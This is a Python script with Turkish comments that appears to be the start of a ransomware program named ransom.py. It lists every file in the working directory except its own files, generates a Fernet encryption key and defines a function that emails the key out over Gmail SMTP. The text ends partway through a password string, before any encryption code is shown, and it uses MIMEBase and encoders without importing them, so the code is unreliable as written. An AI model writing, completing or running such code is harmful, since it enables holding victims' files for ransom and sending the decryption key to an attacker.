import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

def send_email(subject, body, to_address, username, password, attachment_data=None):
    msg = MIMEMultipart()
    msg['From'] = username
    msg['To'] = to_address
    msg['Subject'] = subject

    # E-posta gövdesi
    msg.attach(MIMEText(body, 'plain'))

    # E-posta eki
    if attachment_data:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment_data)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename=generatedkey.key')
        msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(username, password)
        server.sendmail(username, to_address, msg.as_string())

# Dosya isimlerini toplamak için kullanılan kodu buraya ekleyin
files = []
for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Anahtarı oluştur
key = Fernet.generate_key()

# Gmail hesabınızın kullanıcı adı ve şifresi
gmail_username = 'your_email@gmail.com'
gmail_password = 'your_email_pass
